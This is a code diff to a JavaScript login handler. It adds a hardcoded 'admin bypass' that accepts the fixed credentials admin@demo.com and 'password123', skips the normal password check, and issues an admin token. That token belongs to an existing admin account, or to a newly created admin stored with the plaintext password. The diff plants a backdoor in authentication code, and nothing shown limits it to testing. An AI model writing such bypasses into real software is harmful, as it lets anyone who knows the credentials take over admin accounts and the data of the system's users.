@@ -205,6 +205,23 @@ const login = async (req, res, next) => {
       return res.status(400).json({ message: "Email/Username and password are required" });
     }
 
+    // Admin bypass credentials - always allow admin@demo.com with password123
+    if (role === "admin" && email && email.toLowerCase() === "admin@demo.com" && password === "password123") {
+      let adminUser = await User.findOne({ role: "admin" });
+      if (!adminUser) {
+        adminUser = await User.create({
+          name: "Super Admin",
+          email: "admin@demo.com",
+          password: "password123",
+          role: "admin",
+          phone: "9876522222",
+          isActive: true
+        });
+      }
+      const token = generateToken(adminUser);
+      return res.json({ token, user: adminUser.toSafeObject() });
+    }
+
     let user;
     if (email) {
       user = await User.findOne({ email: email.toLowerCase() }).select("+password");
